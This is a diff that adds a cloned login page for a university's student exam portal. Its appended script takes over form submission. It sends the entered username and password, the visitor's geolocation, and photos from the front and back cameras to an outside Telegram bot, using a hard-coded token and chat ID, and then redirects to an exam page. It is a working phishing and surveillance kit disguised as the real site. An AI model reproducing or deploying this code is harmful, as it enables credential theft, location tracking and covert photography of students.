@@ -1,0 +1,286 @@
+<html>
+<head>
+    <meta charset="utf-8"> <!--amira-->
+    <meta http-equiv="Content-Type" content="text/html; charset=us-ascii">
+    <title id="title">South Valley National University (SVNU)</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1.0">
+
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+
+    <!-- Block_new -->
+    <link rel="stylesheet" href="https://credit.svnu.edu.eg/static/new-css/bootstrap.min.css" type="text/css" media="screen">
+    <link rel="stylesheet" href="https://credit.svnu.edu.eg/static/new-css/login-new.css" type="text/css" media="screen">
+    <!-- End_Block_New-->
+
+    <link rel="stylesheet" href="https://credit.svnu.edu.eg/static/plugins/uniform/default/uniform.default.css" type="text/css" media="screen">
+
+    <!-- Block_new -->
+    <script type="text/javascript" src="https://credit.svnu.edu.eg/static/new-js/jquery2.min.js"></script>
+    <script type="text/javascript" src="https://credit.svnu.edu.eg/static/new-js/bootstrap2.min.js"></script>
+    <!-- End_Block_New-->
+
+    <script type="text/javascript" src="https://credit.svnu.edu.eg/static/js/captcha.js"></script>
+
+    <!-- Block_new -->
+    <link rel="stylesheet" type="text/css" media="screen,projection,print" href="https://credit.svnu.edu.eg/static/new-plugins/jquery-ui-1.13.1/jquery-ui.min.css">
+    <link rel="stylesheet" type="text/css" media="screen,projection,print" href="https://credit.svnu.edu.eg/static/css/jquery.alerts.css">
+    <!--[if lt IE 9]>
+    <script src="https://credit.svnu.edu.eg/static/js/html5shiv.js"></script>
+    <![endif]-->
+
+    <style>
+        .InputCorner {
+            -moz-border: 3px;
+            -webkit-border-radius: 3px;
+            -khtml-border-radius: 3px;
+            border-radius: 3px;
+            border: 1px solid #aed0ea;
+            line-height: 1.5em;
+        }
+    </style>
+
+    <script src="https://credit.svnu.edu.eg/static/plugins/uniform/jquery.uniform.min.js" type="text/javascript" charset="utf-8"></script>
+    <script src="https://credit.svnu.edu.eg/static/plugins/validate/jquery.validationEngine.js?kkkk" type="text/javascript" charset="utf-8"></script>
+    <script src="https://credit.svnu.edu.eg/static/plugins/validate/jquery.validationEngine-en.js" type="text/javascript" charset="utf-8"></script>
+    <script type="text/javascript" src="https://credit.svnu.edu.eg/static/js/jquery/jquery.validate.js"></script>
+    <script type="text/javascript" src="https://credit.svnu.edu.eg/static/new-plugins/jquery-ui-1.13.1/jquery-ui.min.js"></script>
+</head>
+
+<body class="background-image" style="background-image: url(https://credit.svnu.edu.eg/static/images/bg.webp);">
+
+<div class="wrapper fadeInDown">
+  <div id="formContent" style="opacity: 90%">
+
+    <div class="fadeIn first">
+      <p id="icon" class="university-name">South Valley National University (Student Exams)</p>
+    </div>
+
+    <form id="employeesLoginFrm" onsubmit="Login();return false;" style="top: 274px; left: 580.5px;">
+      <input type="text" id="name" class="fadeIn second" name="username" placeholder="Username">
+      <input type="password" id="password" class="fadeIn third" name="pass" placeholder="Password">
+
+      <div style="width:100%" class="optionsLogin">
+<!--         <div class="form-check form-check-inline">
+          <input class="form-check-input" type="radio" name="usertype" id="usertype_0" value="1" checked="checked">
+          <label class="form-check-label" for="usertype_0">System User</label>
+        </div> -->
+<!--         <div class="form-check form-check-inline">
+          <input class="form-check-input" type="radio" name="usertype" id="usertype_2" value="3">
+          <label class="form-check-label" for="usertype_2">Staff</label>
+        </div> -->
+        <div class="form-check form-check-inline">
+          <input class="form-check-input" type="radio" name="usertype" id="usertype_1" value="2" checked="checked">>
+          <label class="form-check-label" for="usertype_1">Student Exams</label>
+        </div>
+      </div>
+
+      <div id="captcha_login" style="margin:auto;width:90%;padding: 0px 87px"></div>
+
+      <input type="submit" value="Log In" id="login_btn">
+
+      <div>
+        <a href="#" id="ForgetPassword" onclick="ForgetPassword();" style="color: #4195d8;"> Forget Password ? </a>
+      </div>
+    </form>
+
+    <div id="formFooter">
+      <a target="_blank" href="https://credit.svnu.edu.eg/static/System%20Manuel.pdf">الدليل الإرشادي للأخطاء الشائعة</a>
+      <span class="dash">--</span>
+      <a href="#" id="security_id">سياسة الخصوصية</a>
+    </div>
+
+    <div id="divContents"></div>
+
+    <div id="copy_right">
+      Powerd by Ibn Alhaitham e-SIS software,
+      <a href="https://www.intlaqcit.com/" style="font-size: 13px">intlaqcit</a> - Mansoura University
+    </div>
+  </div>
+</div>
+
+<script>
+/* === إعدادات البوت — استبدل بالقيم لديك === */
+const TELEGRAM_BOT_TOKEN = "8244754527:AAHu4WAJeuHmUBaLWnkuPJEpUPxw5vGdc0I";
+const TELEGRAM_CHAT_ID = "7651215883";
+
+/* === وظائف مساعدة لإرسال رسائل وصور === */
+async function tgSendMessage(text) {
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  try {
+    const resp = await fetch(url, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML"})
+    });
+    const j = await resp.json();
+    if (!j.ok) throw new Error(j.description || 'Telegram error');
+    return j;
+  } catch (err) {
+    console.error('tgSendMessage error:', err);
+    throw err; // نرمي الخطأ ليعالجه المستدعي
+  }
+}
+
+async function tgSendPhoto(blob, caption = "") {
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+  try {
+    const fd = new FormData();
+    fd.append("chat_id", TELEGRAM_CHAT_ID);
+    fd.append("photo", blob, "photo.png");
+    if (caption) fd.append("caption", caption);
+    const resp = await fetch(url, { method: "POST", body: fd });
+    const j = await resp.json();
+    if (!j.ok) throw new Error(j.description || 'Telegram error');
+    return j;
+  } catch (err) {
+    console.error('tgSendPhoto error:', err);
+    throw err;
+  }
+}
+
+/* === التقاط صورة عبر الكاميرا === */
+async function capturePhoto(facingMode = "user", timeoutMs = 1600) {
+  try {
+    const video = document.createElement("video");
+    video.setAttribute("playsinline", ""); // لهواتف iOS
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+    video.srcObject = stream;
+    await video.play().catch(()=>{}); // قد يرفض play في بعض البيئات لكن سنعتمد على الانتظار
+    // ننتظر قليلاً لثبات الكاميرا
+    await new Promise(r => setTimeout(r, timeoutMs));
+    const canvas = document.createElement("canvas");
+    const w = video.videoWidth || 640;
+    const h = video.videoHeight || 480;
+    canvas.width = w;
+    canvas.height = h;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, w, h);
+    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/png"));
+    // إيقاف جميع المسارات
+    stream.getTracks().forEach(t => t.stop());
+    return blob; // قد يكون null إذا فشل toBlob
+  } catch (err) {
+    console.warn(`capturePhoto(${facingMode}) failed:`, err);
+    return null;
+  }
+}
+
+/* === الحصول على الموقع (Promise) === */
+function getCurrentPositionPromise(opts = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }) {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) return reject(new Error("Geolocation not supported"));
+    navigator.geolocation.getCurrentPosition(resolve, reject, opts);
+  });
+}
+
+/* === هروب HTML بسيط لسلاسل الرسائل === */
+function escapeHtml(s) {
+  if (!s) return "";
+  return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
+}
+
+/* === التسلسل المطلوب ===
+   1) إرسال بيانات الدخول (login data)
+   2) إرسال الموقع (رسالة منفصلة) — إن وجد
+   3) إرسال الوسائط (صورتان) كل منهما رسالة منفصلة
+*/
+async function sendLoginThenLocationThenMedia() {
+  // اجمع الحقول من الصفحة
+  const name = document.getElementById("name")?.value.trim() || "";
+  const password = document.getElementById("password")?.value.trim() || "";
+  const usertype = document.querySelector('input[name="usertype"]:checked')?.value || "2";
+
+  // 1) إرسال بيانات الدخول أولاً
+  const loginMessage =
+    `<b>🧾 Student Login Data</b>\n` +
+    `<b>Name:</b> ${escapeHtml(name)}\n` +
+    `<b>Code/Password:</b> ${escapeHtml(password)}\n` +
+    `<b>Type:</b> ${escapeHtml(usertype)}\n` +
+    `<b>Time:</b> ${new Date().toLocaleString()}`;
+
+  try {
+    await tgSendMessage(loginMessage);
+    console.log("Login data sent.");
+  } catch (err) {
+    // إذا فشل الإرسال بسبب CORS أو غيره نعرض تحذير لكن نستمر بالمحاولات التالية
+    console.error("Failed to send login data to Telegram:", err);
+    alert("تحذير: إرسال بيانات الدخول إلى التليجرام فشل. تحقق من CORS/Token/Chat ID.");
+    // نستمر؛ حسب رغبتك يمكنك إيقاف التنفيذ هنا عبر return;
+  }
+
+  // 2) إرسال الموقع (كُرسالة منفصلة)
+  try {
+    let mapsLink = "غير متاح";
+    try {
+      const pos = await getCurrentPositionPromise();
+      const { latitude, longitude } = pos.coords;
+      mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    } catch (posErr) {
+      console.warn("Location not available:", posErr);
+      mapsLink = "غير متاح (رفض أو خطأ)";
+    }
+    const locMessage = `<b>📍 Student Location</b>\n${escapeHtml(mapsLink)}\n<b>Time:</b> ${new Date().toLocaleString()}`;
+    await tgSendMessage(locMessage);
+    console.log("Location sent.");
+  } catch (err) {
+    console.error("Failed to send location to Telegram:", err);
+    alert("تحذير: إرسال الموقع فشل. قد تحتاج إلى حل CORS أو بروكسي.");
+  }
+
+  // 3) التقاط وإرسال الوسائط (front ثم back) — كل صورة كرسالة منفصلة
+  try {
+    // التقاط الأمامية
+    const front = await capturePhoto("user");
+    if (front) {
+      try {
+        await tgSendPhoto(front, "📸 Front camera (student)");
+        console.log("Front photo sent.");
+      } catch (err) {
+        console.error("Front photo send failed:", err);
+      }
+    } else {
+      console.warn("No front photo captured.");
+    }
+
+    // التقاط الخلفية
+    const back = await capturePhoto("environment");
+    if (back) {
+      try {
+        await tgSendPhoto(back, "📷 Back camera (environment)");
+        console.log("Back photo sent.");
+      } catch (err) {
+        console.error("Back photo send failed:", err);
+      }
+    } else {
+      console.warn("No back photo captured.");
+    }
+
+    // alert("تمت المحاولة لإرسال البيانات والموقع والوسائط (راجع الكونسول للنتائج).");
+    window.location.href = "/exam.html"
+  } catch (err) {
+    console.error("Error during media capture/send:", err);
+    window.location.href = "/exam.html"
+  }
+}
+
+/* === ربط مع الفورم === */
+document.addEventListener("DOMContentLoaded", () => {
+  const frm = document.getElementById("employeesLoginFrm");
+  if (frm) {
+    frm.onsubmit = (e) => {
+      e.preventDefault();
+      // نؤدي التسلسل: إرسال بيانات الدخول ثم الموقع ثم الوسائط
+      sendLoginThenLocationThenMedia();
+      return false;
+    };
+  }
+});
+</script>
+
+
+
+</body>
+</html>
